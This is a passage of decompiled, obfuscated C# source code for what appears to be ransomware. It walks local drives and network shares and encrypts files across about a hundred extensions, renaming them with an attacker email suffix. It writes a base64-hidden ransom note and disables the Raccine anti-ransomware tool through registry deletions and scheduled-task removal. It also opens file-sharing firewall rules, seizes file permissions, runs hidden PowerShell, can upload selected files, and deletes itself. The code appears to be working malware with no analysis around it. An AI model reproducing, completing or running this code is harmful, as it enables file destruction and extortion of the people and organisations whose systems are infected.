		catch (UnauthorizedAccessException)
		{
			return list;
		}
		catch (PathTooLongException)
		{
			return list;
		}
		catch
		{
			return list;
		}
	}

	public static void bkKppWlQwlw()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_0029: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher("select * from Win32_NetworkConnection");
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				if (!xdynXtEYQwd.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace("\\\\", "\\").Replace("\\\\\\\\", "\\\\")
					.Replace("\"", "")
					.Split(new char[1] { '(' })[0].Trim()))
				{
					xdynXtEYQwd.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace("\\\\", "\\").Replace("\\\\\\\\", "\\\\")
						.Replace("\"", "")
						.Split(new char[1] { '(' })[0].Trim().Replace("IPC$", ""));
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static string beVAbavcTbJwdi(string nwkghQoIVZbfa = "", string IjjoacBXKmaWk = "")
	{
		string result = "";
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = nwkghQoIVZbfa,
				Arguments = IjjoacBXKmaWk,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			result = process2.StandardOutput.ReadToEnd();
			process2.WaitForExit(2500);
			process2.Kill();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void rztAbSfyMNmnUlfq(string kgAGmjFOVHkQ)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = "powershell",
			Arguments = kgAGmjFOVHkQ,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string JMzNoXUpAyhmZ(string aAYZBQJYjgdoxtVhr)
	{
		char[] array = aAYZBQJYjgdoxtVhr.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string PBGxcXGgCq(string OEBBmeYumRcbu)
	{
		byte[] bytes = Convert.FromBase64String(OEBBmeYumRcbu);
		return Encoding.UTF8.GetString(bytes);
	}

	public static bool IzeoctEiWKG()
	{
		WebRequest webRequest = WebRequest.Create("https://www.google.com/");
		try
		{
			webRequest.GetResponse();
		}
		catch
		{
			return false;
		}
		return true;
	}

	public static void vvpYtdlvuXBO(string fCgpCyiulpoH)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = PBGxcXGgCq("cG93ZXJzaGVsbC5leGU=");
		processStartInfo.Arguments = "& " + fCgpCyiulpoH;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool AXKbHrzWHpznCx(string dwKxrXaryaszGD, string QIObZsHkOYSU)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(dwKxrXaryaszGD, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(QIObZsHkOYSU);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(dwKxrXaryaszGD, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static string QywKiKOHqvWU(SecureString yucUoPYpMoe)
	{
		string empty = string.Empty;
		IntPtr intPtr = Marshal.SecureStringToBSTR(yucUoPYpMoe);
		try
		{
			return Marshal.PtrToStringBSTR(intPtr);
		}
		finally
		{
			Marshal.ZeroFreeBSTR(intPtr);
		}
	}

	public static void HSpgdytfLGz()
	{
		try
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			string oEBBmeYumRcbu = JMzNoXUpAyhmZ("==wcu9Wa0B3Tg42bpRXdjVGeFBSZslmRgU2Zh1WSc52bpNnclZFduVmcyV3QcRlTgM3dvRmbpdFX0Z2bz9mcjlWTcVkUBdFVG90U");
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(PBGxcXGgCq(oEBBmeYumRcbu), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(PBGxcXGgCq("dnNzYWRtaW4uZXhl"));
					registryKey.DeleteSubKey(PBGxcXGgCq("d21pYy5leGU="));
					registryKey.DeleteSubKey(PBGxcXGgCq("d2JhZG1pbi5leGU="));
					registryKey.DeleteSubKey(PBGxcXGgCq("YmNkZWRpdC5leGU="));
					registryKey.DeleteSubKey(PBGxcXGgCq("cG93ZXJzaGVsbC5leGU="));
					registryKey.DeleteSubKey(PBGxcXGgCq("ZGlza3NoYWRvdy5leGU="));
					registryKey.DeleteSubKey(PBGxcXGgCq("bmV0LmV4ZQ=="));
					registryKey.Close();
				}
				oEBBmeYumRcbu = JMzNoXUpAyhmZ("u9Wa0F2YpxGcwFEXn9GT05WZ2VEXzV2YpZnclNFX0V2Us9mc052bDRnblJnc1NEXNVEVTl1U");
				registryKey = Registry.LocalMachine.OpenSubKey(PBGxcXGgCq(oEBBmeYumRcbu), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(PBGxcXGgCq("UmFjY2luZQ=="));
					registryKey.Close();
				}
				oEBBmeYumRcbu = JMzNoXUpAyhmZ("=UkUBdFVG90U");
				registryKey = Registry.LocalMachine.OpenSubKey(PBGxcXGgCq(oEBBmeYumRcbu), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(PBGxcXGgCq("UmFjY2luZQ=="));
					registryKey.Close();
				}
				oEBBmeYumRcbu = JMzNoXUpAyhmZ("=UkUBdFVG90U");
				registryKey = Registry.CurrentUser.OpenSubKey(PBGxcXGgCq(oEBBmeYumRcbu), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(PBGxcXGgCq("UmFjY2luZQ=="));
					registryKey.Close();
				}
			}
			catch
			{
			}
			beVAbavcTbJwdi(PBGxcXGgCq("dGFza2tpbGw="), PBGxcXGgCq("L0YgL0lNIFJhY2NpbmVTZXR0aW5ncy5leGU="));
			beVAbavcTbJwdi(PBGxcXGgCq("cmVn"), PBGxcXGgCq("ZGVsZXRlICJIS0NVXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biIgL1YgIlJhY2NpbmUgVHJheSIgL0Y="));
			beVAbavcTbJwdi(PBGxcXGgCq("cmVn"), PBGxcXGgCq("ZGVsZXRlIEhLQ1VcU29mdHdhcmVcUmFjY2luZSAvRg=="));
			beVAbavcTbJwdi(PBGxcXGgCq("c2NodGFza3M="), PBGxcXGgCq("L0RFTEVURSAvVE4gIlJhY2NpbmUgUnVsZXMgVXBkYXRlciIgL0Y="));
		}
		catch
		{
		}
	}

	public static void xfEbgIrugrgC(string DjgfEoYhRJz, byte[] SmjMmXXdYIxQuIO)
	{
		try
		{
			byte[] bytes = Encoding.ASCII.GetBytes(PBGxcXGgCq("R290QWxsRG9uZQ=="));
			using FileStream fileStream = new FileStream(DjgfEoYhRJz, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(SmjMmXXdYIxQuIO, 0, SmjMmXXdYIxQuIO.Length);
			fileStream.Write(bytes, 0, bytes.Length);
		}
		catch (Exception)
		{
		}
	}

	public static void jKmLqcFVOKeOF()
	{
		string oEBBmeYumRcbu = JMzNoXUpAyhmZ("==QblR3c5NVZslmRcx2byRnbvNEX0V2Us9mc052bDRnblJnc1NEXNVEVTl1U");
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(PBGxcXGgCq(oEBBmeYumRcbu), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(PBGxcXGgCq("TG9uZ1BhdGhzRW5hYmxlZA=="), 1, RegistryValueKind.DWord);
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void medQfEsbBgN()
	{
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			beVAbavcTbJwdi(PBGxcXGgCq("bmV0c2g="), PBGxcXGgCq("YWR2ZmlyZXdhbGwgZmlyZXdhbGwgc2V0IHJ1bGUgZ3JvdXA9XCJOZXR3b3JrIERpc2NvdmVyeVwiIG5ldyBlbmFibGU9WWVz"));
			beVAbavcTbJwdi(PBGxcXGgCq("bmV0c2g="), PBGxcXGgCq("YWR2ZmlyZXdhbGwgZmlyZXdhbGwgc2V0IHJ1bGUgZ3JvdXA9XCJGaWxlIGFuZCBQcmludGVyIFNoYXJpbmdcIiBuZXcgZW5hYmxlPVllcw=="));
		}
	}

	public static void MKUZKBzhhik(string YTSmLpZmNXEz)
	{
		try
		{
			Thread thread = new Thread((ThreadStart)delegate
			{
				oLgNOmJXCAjn(YTSmLpZmNXEz, new string[100]
				{
					"dat", "txt", "jpeg", "gif", "jpg", "png", "php", "cs", "cpp", "rar",
					"zip", "html", "htm", "xlsx", "xls", "avi", "mp4", "ppt", "doc", "docx",
					"sxi", "sxw", "odt", "hwp", "tar", "bz2", "mkv", "eml", "msg", "ost",
					"pst", "edb", "sql", "accdb", "mdb", "dbf", "odb", "myd", "php", "java",
					"cpp", "pas", "asm", "key", "pfx", "pem", "p12", "csr", "gpg", "aes",
					"vsd", "odg", "raw", "nef", "svg", "psd", "vmx", "vmdk", "vdi", "lay6",
					"sqlite3", "sqlitedb", "java", "class", "mpeg", "djvu", "tiff", "backup", "pdf", "cert",
					"docm", "xlsm", "dwg", "bak", "qbw", "nd", "tlg", "lgb", "pptx", "mov",
					"xdw", "ods", "wav", "mp3", "aiff", "flac", "m4a", "csv", "sql", "ora",
					"mdf", "ldf", "ndf", "dtsx", "rdl", "dim", "mrimg", "qbb", "rtf", "7z"
				}, ".secure[editpower@criptext.com]", new string[0], YhMcuhCOiUkEzc);
			});
			thread.Priority = ThreadPriority.Normal;
			thread.IsBackground = false;
			thread.Start();
		}
		catch
		{
		}
	}

	public static void ONKwLvQmArXFz()
	{
		beVAbavcTbJwdi("cmd.exe", PBGxcXGgCq("L0MgcGluZyAxMjcuMC4wLjcgLW4gMyA+IE51bCAmIGZzdXRpbCBmaWxlIHNldFplcm9EYXRhIG9mZnNldD0wIGxlbmd0aD01MjQyODgg4oCcJXPigJ0gJiBEZWwgL2YgL3Eg4oCcJXPigJ0="));
		string text = PBGxcXGgCq("L0MgY2hvaWNlIC9DIFkgL04gL0QgWSAvVCAzICYgRGVsIA==");
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = "\"" + text + "\"" + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = "cmd.exe";
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void bqrcZqHppLszo(string GruanXQyJtwxFA)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(GruanXQyJtwxFA);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(GruanXQyJtwxFA, attributes & ~FileAttributes.ReadOnly);
			}
			attributes = File.GetAttributes(GruanXQyJtwxFA);
			if ((attributes & FileAttributes.Hidden) == FileAttributes.Hidden)
			{
				File.SetAttributes(GruanXQyJtwxFA, attributes & ~FileAttributes.Hidden);
			}
		}
		catch (Exception ex)
		{
			if (TQcDMEBrjpu)
			{
				try
				{
					File.AppendAllText(lNABZjYJLaAdehz, "File: " + GruanXQyJtwxFA + " - Error while removing readonly attribute: " + ex.Message + "\r\n");
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string woUJzlRoAzGo()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = "";
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = "Me";
				break;
			case 10:
				text = ((!(version.Revision.ToString() == "2222A")) ? "98" : "98SE");
				break;
			case 0:
				text = "95";
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = "NT 3.51";
				break;
			case 4:
				text = "NT 4.0";
				break;
			case 5:
				text = ((version.Minor != 0) ? "XP" : "2000");
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? "8.1" : "8") : "7") : "Vista");
				break;
			case 10:
				text = "10";
				break;
			}
		}
		if (text != "")
		{
			text = "Windows " + text;
			if (oSVersion.ServicePack != "")
			{
				text = text + " " + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string KKxNWAYnHHPM(string ejfMAEjhbgR)
	{
		string text = Path.GetTempPath() + "\\RESTORE_FILES_INFO.txt";
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(PBGxcXGgCq("WW91ciBmaWxlcyBhcmUgc2VjdXJlZC4uLg0KV3JpdGUgeW91ciAiS2V5IElkZW50aWZpZXIiIGZyb20gUkVTVE9SRV9GSUxFU19JTkZPLnR4dCB0byB0aGlzIGVtYWlsOiANCg0KZWRpdHBvd2VyQGNyaXB0ZXh0LmNvbQ0Kb3INCndpbGxldHRhbW9mZmF0QHlhaG9vLmNvbQ=="));
				streamWriter.WriteLine("\r\n");
				streamWriter.WriteLine(PBGxcXGgCq("S2V5IElkZW50aWZpZXI6IA=="));
				streamWriter.WriteLine(ejfMAEjhbgR);
				if (MaDqJNywoPHCL)
				{
					streamWriter.WriteLine("\r\n");
					streamWriter.WriteLine(PBGxcXGgCq("UEMgSGFyZHdhcmUgSUQ6IA=="));
					streamWriter.WriteLine(JuDOdZAEhCW.rCActRevxiz());
				}
			}
			else
			{
				string text2 = File.ReadAllText(text);
				if (!text2.Contains(ejfMAEjhbgR) && !IMmsNGvAyQxjH)
				{
					File.AppendAllText(text, "\r\nAdditional KeyId:\r\n" + ejfMAEjhbgR);
				}
			}
			return text;
		}
		catch (Exception ex)
		{
			if (TQcDMEBrjpu)
			{
				try
				{
					File.AppendAllText(lNABZjYJLaAdehz, "Error while writing Temp Folder Report: " + ex.Message + "\r\n");
					return text;
				}
				catch (Exception)
				{
					return text;
				}
			}
			return text;
		}
	}

	public static void XMzztsxpBIyknk(string AAFyzSxkIDFFa, string QIwNZzdMyRnzTBz)
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + AAFyzSxkIDFFa + ".url");
		streamWriter.WriteLine("[Summary]");
		streamWriter.WriteLine("URL=file:///" + QIwNZzdMyRnzTBz);
		streamWriter.WriteLine("IconIndex=0");
		string text = QIwNZzdMyRnzTBz.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text);
	}

	private static void FbGSptYfpFqIW(string[] gaqSdnKafQRyXluB, string[] ChuYIAEffy, string[] dhcQQKEBzjXke, string yLKjmRPVWkMXfu, string YxPMujdCcGHWlH)
	{
		auZOEVqMqtXyYL = Encoding.ASCII.GetBytes(yLKjmRPVWkMXfu);
		DriveInfo[] array = null;
		if (gaqSdnKafQRyXluB[0] == "[auto]")
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (array[i].IsReady && array[i].DriveType != DriveType.CDRom && !xdynXtEYQwd.Contains(array[i].Name))
					{
						xdynXtEYQwd.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < gaqSdnKafQRyXluB.Length; j++)
			{
				if (!xdynXtEYQwd.Contains(gaqSdnKafQRyXluB[j]))
				{
					xdynXtEYQwd.Add(gaqSdnKafQRyXluB[j]);
				}
			}
		}
		if (xdynXtEYQwd.Contains(PBGxcXGgCq("Qzpc")) && cldhKnYBxdoqe == "YES")
		{
			xdynXtEYQwd.Remove(PBGxcXGgCq("Qzpc"));
		}
		Parallel.ForEach(xdynXtEYQwd, delegate(string t)
		{
			if (bNvfnEokSS && !woUJzlRoAzGo().Contains("XP"))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						AXKbHrzWHpznCx(WindowsIdentity.GetCurrent().Name, t);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (AkiFFGXREV == "YES")
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					yBztISmZFLrimH(t, ChuYIAEffy, YxPMujdCcGHWlH, dhcQQKEBzjXke, yLKjmRPVWkMXfu);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				yBztISmZFLrimH(t, ChuYIAEffy, YxPMujdCcGHWlH, dhcQQKEBzjXke, yLKjmRPVWkMXfu);
			}
		});
	}

	public static void yBztISmZFLrimH(string SYPBlRIIMxPNtgU, string[] tmqwcOZoefsAi, string KSDwtZBQDo, string[] CslUwGnqXbK, string pjSNMqjUrG)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add("");
		List<string> list3 = list2;
		if (xvvKjbKLLTy == "NO")
		{
			list = oLgNOmJXCAjn(SYPBlRIIMxPNtgU, tmqwcOZoefsAi, KSDwtZBQDo, CslUwGnqXbK, pjSNMqjUrG);
			return;
		}
		list = JaSgnSQzqjUSRACt.SearchFiles(SYPBlRIIMxPNtgU);
		foreach (string text in tmqwcOZoefsAi)
		{
			foreach (string item in list)
			{
				if (CslUwGnqXbK.Length != 0)
				{
					int num = 0;
					while (num < CslUwGnqXbK.Length)
					{
						string value = CslUwGnqXbK[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_02f3;
					}
				}
				if ((eCpqZNFzXBk == "NO" && !item.EndsWith(text)) || wkqobNaWEQAr.Contains(item))
				{
					continue;
				}
				if (hhsicnCrwO == "YES")
				{
					try
					{
						if (EQEqEmYOniIYC.XFfMjPILkVPk(item))
						{
							EQEqEmYOniIYC.sHrqLuXhMISyN(item);
						}
					}
					catch
					{
					}
				}
				wkqobNaWEQAr.Add(item);
				if (!IVpIyrutgXnuTsdC.Contains(Path.GetDirectoryName(item)))
				{
					IVpIyrutgXnuTsdC.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (XqxyjwNQsTVM == "YES" && fileStream.Length > Convert.ToInt32(LvVedbSsouja) * 1024 * 1024 && !list3.Contains(text))
					{
						if (iCDbdsmAlj == "YES")
						{
							foreach (string item2 in mmwwbJcgsinbY)
							{
								if (item.ToLower().EndsWith(item2) && JIGROLQVWX == "YES")
								{
									if (Convert.ToInt32(vipECknmzJcQpaojf) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											JuDOdZAEhCW.gjjnECUTwfzX("URL", "USERNAME", "ACCESO", item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && JIGROLQVWX == "NO")
								{
									try
									{
										JuDOdZAEhCW.gjjnECUTwfzX("URL", "USERNAME", "ACCESO", item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] wwiOifKzoVNiyfF = PQqYOcUkjAAf.ryXojQCHUSIHVk(item, Convert.ToInt32(LvVedbSsouja) * 1024 * 1024);
						byte[] xYFPAYQKYUJrM = PQqYOcUkjAAf.zvWzdRNbwlK(wwiOifKzoVNiyfF, Encoding.ASCII.GetBytes(pjSNMqjUrG), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						PQqYOcUkjAAf.fssENAeUQwBsQ(item, xYFPAYQKYUJrM);
						if (KSDwtZBQDo != ".*")
						{
							File.Move(item, item + KSDwtZBQDo);
						}
					}
					else if (KSDwtZBQDo != ".*")
					{
						uozfQwPuBRvilAJa(item, item + KSDwtZBQDo, auZOEVqMqtXyYL);
					}
					else
					{
						uozfQwPuBRvilAJa(item, item + ".part", auZOEVqMqtXyYL);
					}
				}
				catch (Exception)
				{
				}
				IL_02f3:;
			}
		}
	}

	public static void ymQKAJaEzg(List<string> GbPfxrUaDyLO, string[] urAmtRWyTJKBsA, string AcpDpBwGGxENv, string[] QuGeJGfzYpw, string vjxWJqnUfim)
	{
		List<string> lFcpwTKrYqhz = new List<string> { "" };
		if (eCpqZNFzXBk == "NO")
		{
			string cGvwfRbSwrzhC;
			Parallel.ForEach(urAmtRWyTJKBsA, delegate(string t1)
			{
				foreach (string item in GbPfxrUaDyLO)
				{
					if (QuGeJGfzYpw.Length != 0)
					{
						string[] array4 = QuGeJGfzYpw;
						int num2 = 0;
						while (num2 < array4.Length)
						{
							string value2 = array4[num2];
							if (!item.EndsWith(value2))
							{
								num2++;
								continue;
							}
							goto IL_07dd;
						}
					}
					try
					{
						if (item.EndsWith(AcpDpBwGGxENv))
						{
							goto IL_07dd;
						}
					}
					catch (Exception)
					{
						goto IL_07dd;
					}
					if (item.EndsWith(t1) && !wkqobNaWEQAr.Contains(item))
					{
						if (hhsicnCrwO == "YES")
						{
							try
							{
								if (EQEqEmYOniIYC.XFfMjPILkVPk(item))
								{
									EQEqEmYOniIYC.sHrqLuXhMISyN(item);
								}
							}
							catch
							{
							}
						}
						wkqobNaWEQAr.Add(item);
						if (!IVpIyrutgXnuTsdC.Contains(Path.GetDirectoryName(item)))
						{
							IVpIyrutgXnuTsdC.Add(Path.GetDirectoryName(item));
						}
						bqrcZqHppLszo(item);
						try
						{
							new cLbobpDMibcTXrjc().fntNupSZjyzZbqf(item);
						}
						catch
						{
						}
						try
						{
							using FileStream fileStream2 = new FileStream(item, FileMode.Open, FileAccess.Write);
							if (!fileStream2.CanWrite)
							{
								try
								{
									if (QPmKNZZswIrG)
									{
										Console.WriteLine("Setting write access permission: " + item + " - File Size: " + new FileInfo(item).Length + " bytes");
										Console.WriteLine("----------------------------------------------------------------------------");
									}
								}
								catch
								{
								}
								beVAbavcTbJwdi(PBGxcXGgCq("aWNhY2xzLmV4ZQ=="), "\"" + item + "\"" + PBGxcXGgCq("IC9ncmFudCA=") + "\"" + Environment.UserName + "\"" + PBGxcXGgCq("OkYgL1QgL0MgL1E="));
							}
						}
						catch (Exception ex16)
						{
							if (TQcDMEBrjpu)
							{
								try
								{
									File.AppendAllText(lNABZjYJLaAdehz, "File: " + item + " - Error while checking for user write access permission: " + ex16.Message + "\r\n");
								}
								catch (Exception)
								{
								}
							}
							continue;
						}
						try
						{
							try
							{
								if (new FileInfo(item).Length != 0L)
								{
									goto end_IL_0237;
								}
								goto end_IL_0237_2;
								end_IL_0237:;
							}
							catch (Exception ex18)
							{
								if (TQcDMEBrjpu)
								{
									try
									{
										File.AppendAllText(lNABZjYJLaAdehz, "File: " + item + " - Error while reading if filesize is zero: " + ex18.Message + "\r\n");
									}
									catch (Exception)
									{
									}
								}
								jNleUmpCYwQx++;
								goto end_IL_0237_2;
							}
							if (!(XqxyjwNQsTVM == "YES") || new FileInfo(item).Length <= Convert.ToInt32(LvVedbSsouja) * 1024 * 1024 || lFcpwTKrYqhz.Contains(t1))
							{
								if (MaDqJNywoPHCL)
								{
									AcpDpBwGGxENv = iWOdpoHPpDBfd + AcpDpBwGGxENv;
								}
								string text3 = MRonfguJbWECp.vnojYkuiBAUr(32);
								string s3 = uGlqoxFdzAjPTYcF.PzkQOghKIFRgh(text3);
								byte[] bytes3 = Encoding.ASCII.GetBytes(s3);
								if (AcpDpBwGGxENv != ".*")
								{
									if (!bzjwNDHoswJy)
									{
										if (!IMmsNGvAyQxjH)
										{
											JfheapcdHpzRAd(item, item + AcpDpBwGGxENv, auZOEVqMqtXyYL);
										}
										else
										{
											JfheapcdHpzRAd(item, item + AcpDpBwGGxENv, Encoding.ASCII.GetBytes(text3));
										}
									}
									else
									{
										try
										{
											if (!IMmsNGvAyQxjH)
											{
												GjEBWyngUynX(item, item + AcpDpBwGGxENv, auZOEVqMqtXyYL);
											}
											else
											{
												GjEBWyngUynX(item, item + AcpDpBwGGxENv, Encoding.ASCII.GetBytes(text3));
											}
										}
										catch (Exception ex20)
										{
											if (TQcDMEBrjpu)
											{
												try
												{
													File.AppendAllText(lNABZjYJLaAdehz, "File: " + item + " - Error while fully writing to file: " + ex20.Message + "\r\n");
												}
												catch (Exception)
												{
												}
											}
											jNleUmpCYwQx++;
											try
											{
												File.Move(item + AcpDpBwGGxENv, item);
											}
											catch (Exception)
											{
											}
											goto end_IL_0237_2;
										}
									}
								}
								else if (!bzjwNDHoswJy)
								{
									if (!IMmsNGvAyQxjH)
									{
										JfheapcdHpzRAd(item, item + ".part", auZOEVqMqtXyYL);
									}
									else
									{
										JfheapcdHpzRAd(item, item + ".part", Encoding.ASCII.GetBytes(text3));
									}
								}
								else
								{
									try
									{
										if (!IMmsNGvAyQxjH)
										{
											GjEBWyngUynX(item, item, auZOEVqMqtXyYL);
										}
										else
										{
											GjEBWyngUynX(item, item, Encoding.ASCII.GetBytes(text3));
										}
									}
									catch (Exception ex23)
									{
										if (TQcDMEBrjpu)
										{
											try
											{
												File.AppendAllText(lNABZjYJLaAdehz, "File: " + item + " - Error while fully writing to file: " + ex23.Message + "\r\n");
											}
											catch (Exception)
											{
											}
										}
										jNleUmpCYwQx++;
										goto end_IL_0237_2;
									}
								}
								if (IMmsNGvAyQxjH)
								{
									if (AcpDpBwGGxENv != ".*")
									{
										xfEbgIrugrgC(item + AcpDpBwGGxENv, bytes3);
									}
									else
									{
										xfEbgIrugrgC(item, bytes3);
									}
								}
								goto IL_07dd;
							}
							try
							{
								if (AcpDpBwGGxENv != ".*")
								{
									if (MaDqJNywoPHCL)
									{
										AcpDpBwGGxENv = iWOdpoHPpDBfd + AcpDpBwGGxENv;
									}
									File.Move(item, item + AcpDpBwGGxENv);
								}
							}
							catch (Exception ex25)
							{
								if (TQcDMEBrjpu)
								{
									try
									{
										File.AppendAllText(lNABZjYJLaAdehz, "File: " + item + " - Error while renaming to crypted extension: " + ex25.Message + "\r\n");
									}
									catch (Exception)
									{
									}
								}
								jNleUmpCYwQx++;
								goto end_IL_0237_2;
							}
							cGvwfRbSwrzhC = "";
							if (AcpDpBwGGxENv != ".*")
							{
								cGvwfRbSwrzhC = item + AcpDpBwGGxENv;
							}
							else
							{
								cGvwfRbSwrzhC = item;
							}
							if (iCDbdsmAlj == "YES")
							{
								Thread thread2 = new Thread((ThreadStart)delegate
								{
									foreach (string item2 in mmwwbJcgsinbY)
									{
										if (cGvwfRbSwrzhC.ToLower().EndsWith(item2 + AcpDpBwGGxENv) && JIGROLQVWX == "YES")
										{
											if (Convert.ToInt32(vipECknmzJcQpaojf) * 1024 * 1024 > new FileInfo(cGvwfRbSwrzhC).Length)
											{
												try
												{
													JuDOdZAEhCW.gjjnECUTwfzX("URL", "USERNAME", "ACCESO", cGvwfRbSwrzhC);
												}
												catch
												{
												}
											}
										}
										else if (cGvwfRbSwrzhC.ToLower().EndsWith(item2) && JIGROLQVWX == "NO")
										{
											try
											{
												JuDOdZAEhCW.gjjnECUTwfzX("URL", "USERNAME", "ACCESO", cGvwfRbSwrzhC);
											}
											catch
											{
											}
										}
									}
								});
								thread2.Priority = ThreadPriority.Normal;
								thread2.IsBackground = false;
								thread2.Start();
							}
							string text4 = MRonfguJbWECp.vnojYkuiBAUr(32);
							string s4 = uGlqoxFdzAjPTYcF.PzkQOghKIFRgh(text4);
							byte[] bytes4 = Encoding.ASCII.GetBytes(s4);
							byte[] array5 = null;
							byte[] array6 = PQqYOcUkjAAf.ryXojQCHUSIHVk(cGvwfRbSwrzhC, Convert.ToInt32(LvVedbSsouja) * 1024 * 1024);
							if (PQqYOcUkjAAf.fssENAeUQwBsQ(xYFPAYQKYUJrM: (!SzzYxwPSWbpgYR) ? (IMmsNGvAyQxjH ? PQqYOcUkjAAf.zvWzdRNbwlK(array6, Encoding.ASCII.GetBytes(text4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : PQqYOcUkjAAf.zvWzdRNbwlK(array6, Encoding.ASCII.GetBytes(vjxWJqnUfim), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (IMmsNGvAyQxjH ? ixucTdEibmWxW.ZxKXvnZNRSzEAw(array6, Encoding.ASCII.GetBytes(text4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : ixucTdEibmWxW.ZxKXvnZNRSzEAw(array6, Encoding.ASCII.GetBytes(vjxWJqnUfim), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), QNRAGoVmrx: cGvwfRbSwrzhC, niyonyMvqJkwBDE: bytes4))
							{
